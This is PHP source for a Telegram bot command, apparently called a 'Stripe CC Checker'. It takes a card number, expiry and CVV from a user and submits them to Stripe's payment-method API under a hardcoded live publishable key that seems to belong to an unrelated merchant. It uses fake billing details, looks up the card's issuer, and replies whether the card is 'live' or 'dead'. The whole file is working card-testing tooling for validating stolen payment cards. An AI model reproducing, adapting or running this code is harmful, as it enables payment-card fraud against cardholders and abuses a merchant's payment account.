<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);
        
            $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
            $lista = substr($message, 4);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

            $bin = substr($cc, 0, 6);
            
            ###CHECKER PART###  
            $zip = rand(10001,90045);
            $time = rand(30000,699999);
            $rand = rand(0,99999);
            $pass = rand(0000000000,9999999999);
            $email = substr(md5(mt_rand()), 0, 7);
            $name = substr(md5(mt_rand()), 0, 7);
            $last = substr(md5(mt_rand()), 0, 7);
        
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: m.stripe.com',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Content-Type: text/plain;charset=UTF-8',
            'Origin: https://m.stripe.network',
            'Referer: https://m.stripe.network/inner.html'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            $res = curl_exec($ch);
            $muid = trim(strip_tags(capture($res,'"muid":"','"')));
            $sid = trim(strip_tags(capture($res,'"sid":"','"')));
            $guid = trim(strip_tags(capture($res,'"guid":"','"')));
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
              'Host: api.stripe.com',
              'Accept: application/json',
              'Accept-Language: en-US,en;q=0.9',
              'Content-Type: application/x-www-form-urlencoded',
              'Origin: https://js.stripe.com',
              'Referer: https://js.stripe.com/',
              'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&billing_details[address][postal_code]=10080&billing_details[address][city]=new+york&billing_details[address][country]=US&billing_details[address][line1]=13th+ave+st&billing_details[email]=kjhsfkjhkj%40gnauk.co&billing_details[name]=hsdkjfh+kjsdajfh&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid=eeecd20f-d116-4edb-af79-8ab85acc0598edab84&muid=9a9e7a90-ff30-47b3-baa9-0fd142b840923921a6&sid=7b085b3c-01cb-49f5-8568-4844da7df19e654348&pasted_fields=number&payment_user_agent=stripe.js%2Fba1c1ad93%3B+stripe-js-v3%2Fba1c1ad93&time_on_page=73410&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU");
            $result1 = curl_exec($ch);
            
            if(stripos($result1, 'error')){
              $errormessage = trim(strip_tags(capture($result1,'"message": "','"')));
              $stripeerror = True;
            }else{
            $jsondata = json_decode($result1, true);
            $id = $jsondata['id'];
              $stripeerror = False;
            }

            
            if(!$stripeerror){
                $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
              'Host: api.stripe.com',
              'Accept: application/json',
              'Accept-Language: en-US,en;q=0.9',
              'Content-Type: application/x-www-form-urlencoded',
              'Origin: https://js.stripe.com',
              'Referer: https://js.stripe.com/',
              'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&billing_details[address][postal_code]=10080&billing_details[address][city]=new+york&billing_details[address][country]=US&billing_details[address][line1]=13th+ave+st&billing_details[email]=kjhsfkjhkj%40gnauk.co&billing_details[name]=hsdkjfh+kjsdajfh&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid=eeecd20f-d116-4edb-af79-8ab85acc0598edab84&muid=9a9e7a90-ff30-47b3-baa9-0fd142b840923921a6&sid=7b085b3c-01cb-49f5-8568-4844da7df19e654348&pasted_fields=number&payment_user_agent=stripe.js%2Fba1c1ad93%3B+stripe-js-v3%2Fba1c1ad93&time_on_page=73410&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU");
                $result2 = curl_exec($ch);
                $errormessage = trim(strip_tags(capture($result2,'"text":"','"')));
            }
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '',4);

            ###END OF CHECKER PART###
            
            
            if(strpos($result2, 'client_secret')) {
              addTotal();
              addUserTotal($userId);
              addCVV();
              addUserCVV($userId);
              addCCN();
              addUserCCN($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» CVV or CCN ✅
Response -» $result1 
Response -» $result2 | $errormessage | $id
Gateway -» Stripe Auth 1
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/ninjanaveen'>ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
            elseif($result2 == null && !$stripeerror) {
              addTotal();
              addUserTotal($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» API Down ❌
Response -» $result1 | $result2 | $errormessage | $id
Gateway -» Stripe Auth 1
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/ninjanaveen'>ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
            else{
              addTotal();
              addUserTotal($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» Dead ❌
Response -» $result1 | $result2 | $errormessage | $id
Gateway -» Stripe Auth 1
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/ninjanaveen'>ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
          
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>
